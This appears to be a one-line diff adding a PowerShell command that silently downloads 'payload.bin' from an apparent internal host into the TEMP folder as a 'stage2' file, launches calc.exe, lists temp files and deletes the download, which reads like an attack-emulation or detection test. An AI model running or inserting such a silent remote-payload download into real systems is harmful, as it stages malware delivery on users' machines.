@@ -1,0 +1,1 @@
+$RemoteUrl = 'http://internal.corp/downloads/payload.bin'; $Stage2Path = "$env:TEMP\stage2.bin"; Start-BitsTransfer -Source $RemoteUrl -Destination $Stage2Path -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
